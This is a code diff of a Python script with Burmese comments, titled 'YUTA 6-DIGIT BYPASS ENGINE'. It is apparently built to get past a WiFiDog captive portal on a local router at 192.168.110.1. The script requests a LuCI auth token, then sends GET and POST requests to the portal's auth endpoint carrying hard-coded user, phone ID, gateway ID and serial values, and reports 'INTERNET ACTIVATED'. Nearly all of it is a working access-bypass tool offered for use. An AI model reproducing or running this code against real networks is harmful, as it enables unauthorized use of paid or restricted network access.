@@ -1,37 +1,44 @@
 import sys, os, hashlib, subprocess, datetime, requests, time
+from colorama import Fore, init
 
-# Error တွေမပေါ်စေဖို့ Silent Mode အုပ်ထားတယ်
+init(autoreset=True)
+
 def run_6digit_hack():
+    # အစ်ကို့ Canary အချက်အလက်များ
+    TARGET = {
+        "ip": "192.168.110.1",
+        "user": "810852",
+        "phone": "381060",
+        "id": "58b4bbd9c1e9",
+        "sn": "H1U42FJ004707"
+    }
+    
+    print(f"{Fore.YELLOW}[*] Bypassing Router Gate...")
     with requests.Session() as s:
         s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K)"})
         try:
-            # ၁။ Token ကိုအရင်တောင်းမယ်
-            t_url = "http://192.168.110.1/cgi-bin/luci/api/auth/token?username=810852"
-            res = s.get(t_url, timeout=5)
-            token = res.json().get("token", "810852")
+            # Token Injection
+            t_url = f"http://{TARGET['ip']}/cgi-bin/luci/api/auth/token?username={TARGET['user']}"
+            token = s.get(t_url, timeout=5).json().get("token", TARGET['user'])
             
-            # ၂။ 6-Digit Hack Logic (အစ်ကို့ Canary ထဲက ID တွေနဲ့ ပေါင်းစပ်ထားတယ်)
-            # ဒီနေရာမှာ အဲ့ဒီကောင်သုံးတဲ့ 6-digit code ပတ်ပုံစံမျိုး အတင်းပစ်သွင်းမယ်
-            auth_url = "http://192.168.110.1:2060/wifidog/auth"
-            payload = {
-                "token": token,
-                "phoneNumber": "381060", # ဒါက အစ်ကို့ဆီကရတဲ့ 6-digit id
-                "gw_id": "58b4bbd9c1e9",
-                "gw_sn": "H1U42FJ004707"
-            }
+            # 6-Digit Hack Force
+            auth_url = f"http://{TARGET['ip']}:2060/wifidog/auth"
+            p = {"token": token, "phoneNumber": TARGET['phone'], "gw_id": TARGET['id'], "gw_sn": TARGET['sn']}
             
-            # GET ရော POST ရော ငြိမ်ငြိမ်လေး ပစ်သွင်းမယ်
-            s.get(auth_url, params=payload, timeout=5)
-            s.post(auth_url, data=payload, timeout=5)
+            s.get(auth_url, params=p, timeout=5)
+            s.post(auth_url, data=p, timeout=5)
+            
+            print(f"{Fore.GREEN}[✔] SUCCESS: INTERNET ACTIVATED!")
         except:
-            pass
-
-def check_access():
-    # အစ်ကို့ Key System logic ကို ဒီအပေါ်မှာ ထည့်ထားပါ
-    return True
+            print(f"{Fore.RED}[✘] FAILED: PLEASE CHECK WIFI OR VPN.")
 
 if __name__ == "__main__":
     os.system('clear')
-    if check_access():
-        # Hack Engine ကို run မယ်
-        run_6digit_hack()
+    print(f"{Fore.CYAN}========================================")
+    print(f"{Fore.WHITE}      YUTA 6-DIGIT BYPASS ENGINE")
+    print(f"{Fore.CYAN}========================================")
+    
+    # Bypass ကို ခေါ်မယ်
+    run_6digit_hack()
+    
+    print(f"{Fore.CYAN}========================================")
